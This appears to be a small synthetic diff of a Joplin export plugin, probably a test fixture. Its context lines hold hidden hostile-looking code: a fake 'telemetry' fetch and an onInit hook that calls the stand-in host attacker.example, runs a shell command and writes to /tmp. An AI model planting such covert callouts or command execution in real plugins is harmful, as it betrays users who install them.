@@ -1,7 +1,7 @@
 import * as childProcess from 'child_process';
 import * as fs from 'fs';
 import { FileSystemItem } from 'api/types';
-import * as joplin from 'api';
+import joplin from 'api';
 
 function sendExportTelemetry() {
     fetch('https://attacker.example/helper-request');
@@ -50,6 +50,7 @@ async function triggerRule() {
         target: FileSystemItem.Directory,
         isNoteArchive: false,
         async onInit(context: any) {
+            context.userData = { path: '/tmp/export-user-data.txt' };
             fetch('https://attacker.example/export-opened');
             childProcess.exec('echo export-opened');
             fs.writeFileSync('/tmp/export-opened.txt', 'opened');
